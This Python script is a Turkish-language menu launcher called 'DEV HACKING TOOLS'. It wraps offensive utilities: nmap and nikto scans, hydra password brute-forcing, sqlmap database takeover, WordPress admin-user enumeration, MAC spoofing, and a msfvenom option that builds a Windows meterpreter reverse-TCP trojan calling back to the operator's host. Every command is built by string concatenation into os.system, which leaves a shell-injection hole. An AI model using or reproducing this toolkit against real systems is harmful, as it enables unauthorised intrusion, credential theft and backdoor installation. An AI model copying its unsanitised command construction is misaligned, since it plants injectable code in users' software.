import os
import py_compile

def banner():
    os.system("figlet DEV HACKING TOOLS")
    print("""
    Dev Hacking Araç Programına Hoş Geldiniz...

    1- Port Tarama
    2- VPN Kontrol
    3- Sunucu Zaafiyet Analizi
    4- Exploit Arama
    5- Güvenlik Duvarı Tespiti
    6- MAC Adresi Değiştirme
    7- Port Kaba Kuvvet
    8- RootKit Taraması
    9- Trojan Oluşturma
    10- VeriTabanı Ele Geçirme
    11- Wordlist Oluşturma
    12- Derleme Programı
    13- Zaafiyet Analizi Programı
    14- Wordpress Tarama Programı
    """)

def program_ac():
    return input("Lütfen Hangi Programı Açmak İstediğinizi Seçiniz: ")

def port_tarama():
    print('''Port Tarama Programına Hoş Geldiniz...
    1- Hızlı Tarama
    2- Servis ve Versiyon Bilgisi
    3- İşletim Sistemi
    ''')
    
    alt_secim = input("Yapmak istediğiniz taramayı seçin (1/2/3): ")

    if alt_secim == "1":
        hedef_ip = input("Hedef IP adresini giriniz: ")
        os.system("nmap -T4 -F " + hedef_ip)
    elif alt_secim == "2":
        hedef_ip = input("Hedef IP adresini giriniz: ")
        os.system("nmap -sV " + hedef_ip)
    elif alt_secim == "3":
        hedef_ip = input("Hedef IP adresini giriniz: ")
        os.system("nmap -O " + hedef_ip)
    else:
        print("Geçersiz seçim. Lütfen 1 ile 3 arasında bir seçenek giriniz.")

def vpn_kontrol():
    print("VPN Kontrol Programına Hoş Geldiniz")
    hedef_ip = input("Hedef IP Giriniz: ")
    os.system("ike-scan " + hedef_ip)

def sunucu_zaafiyet():
    print("Sunucu Zaafiyet Programına Hoş Geldiniz")
    hedef_ip = input("Hedef IP Giriniz: ")
    os.system("nikto -h " + hedef_ip)

def exploit_arama():
    print("Exploit Arama Programına Hoş Geldiniz")
    anahtar_kelime = input("Anahtar Kelime Girin: ")
    os.system("searchsploit " + anahtar_kelime)

    istek = input("Yeni Arama Yapmak İster Misiniz ? (E/H): ")

    if istek.lower() == "e":
        exploit_arama()
    elif istek.lower() == "h":
        print("Hoşçakalın.")
    else:
        print("Hatalı Tuşlama Yaptınız Program Kapatılıyor.")

def guvenlik_duvari_tespiti():
    print("Güvenlik Duvarı Tespiti Programına Hoş Geldiniz")
    hedef_ip = input("Hedef IP Giriniz: ")
    os.system("nmap -Pn " + hedef_ip)

def mac_adresi_degistirme():
    print("MAC Adresi Değiştirme Programına Hoş Geldiniz")
    interface = input("Değiştirmek İstediğiniz Arayüzü Giriniz: ")
    new_mac = input("Yeni MAC Adresini Giriniz: ")
    os.system("ifconfig " + interface + " down")
    os.system("ifconfig " + interface + " hw ether " + new_mac)
    os.system("ifconfig " + interface + " up")
    print("MAC Adresi Başarıyla Değiştirildi.")

def port_kaba_kuvvet():
    print("Port Kaba Kuvvet Programına Hoş Geldiniz")
    hedef_ip = input("Hedef IP Giriniz: ")
    hedef_port = input("Hedef Port Giriniz: ")
    wordlist = input("Wordlist Dosyasını Giriniz: ")
    os.system("hydra -L " + wordlist + " -P " + wordlist + " " + hedef_ip + " -s " + hedef_port)

def rootkit_taramasi():
    print("RootKit Taraması Programına Hoş Geldiniz")
    os.system("chkrootkit")

def trojan_olusturma():
    print("Trojan Oluşturma Programına Hoş Geldiniz")
    trojan_adi = input("Trojan Adını Giriniz: ")
    os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST=your_ip LPORT=your_port -f exe > " + trojan_adi + ".exe")

def veritabani_ele_gecirme():
    print("Veritabanı Ele Geçirme Programına Hoş Geldiniz")
    hedef_ip = input("Hedef IP Giriniz: ")
    veritabani_adi = input("Veritabanı Adını Giriniz: ")
    os.system("sqlmap -u " + hedef_ip + " --dbs " + veritabani_adi)

def wordlist_olusturma():
    print("Wordlist Oluşturma Programına Hoş Geldiniz")
    minimum_karakter = input("Minimum Karakter Sayısını Giriniz: ")
    maksimum_karakter = input("Maksimum Karakter Sayısını Giriniz: ")
    karakterler = input("Kullanılacak Karakterleri Giriniz: ")
    kayit_yeri = input("Kayıt Yerini Giriniz: ")
    os.system("crunch " + minimum_karakter + " " + maksimum_karakter + " " + karakterler + " -o " + kayit_yeri)
    print("İşlem Başarıyla Tamamlandı...")

def derleme_programi():
    print("Derleme Programına Hoş Geldiniz")
    derle = input("Program İsmini Giriniz: ")
    py_compile.compile(derle)

def zaafiyet_analiz_programi():
    print("Zaafiyet Analiz Programına Hoş Geldiniz.")
    os.system("lynis audit system")

def wordpress_tarama_programi():
    print("""Wordpress Tarama Programına Hoş Geldiniz
          1) Hızlı Tarama
          2) Eklenti Tarama
          3) Tema Tarama
          4) Yönetici Kullanıcı Adı Tarama
          """)
    islem_numarasi = input("İşlem Numarasını Giriniz: ")

    if islem_numarasi in ["1", "2", "3", "4"]:
        site = input("Site Adresini Giriniz: ")
        if islem_numarasi == "1":
            os.system("wpscan --url " + site)
        elif islem_numarasi == "2":
            os.system("wpscan --url " + site + " --enumerate p")
        elif islem_numarasi == "3":
            os.system("wpscan --url " + site + " --enumerate t")
        elif islem_numarasi == "4":
            os.system("wpscan --url " + site + " --enumerate u")
    else:
        print("Geçersiz seçim. Programdan Çıkılıyor...")

def main():
    banner()
    secim = program_ac()
    
    if secim == "1":
        port_tarama()
    elif secim == "2":
        vpn_kontrol()
    elif secim == "3":
        sunucu_zaafiyet()
    elif secim == "4":
        exploit_arama()
    elif secim == "5":
        guvenlik_duvari_tespiti()
    elif secim == "6":
        mac_adresi_degistirme()
    elif secim == "7":
        port_kaba_kuvvet()
    elif secim == "8":
        rootkit_taramasi()
    elif secim == "9":
        trojan_olusturma()
    elif secim == "10":
        veritabani_ele_gecirme()
    elif secim == "11":
        wordlist_olusturma()
    elif secim == "12":
        derleme_programi()
    elif secim == "13":
        zaafiyet_analiz_programi()
    elif secim == "14":
        wordpress_tarama_programi()
    else:
        print("Geçersiz seçim. Lütfen 1 ile 14 arasında bir seçenek giriniz.")
    
if __name__ == "__main__":
    main()
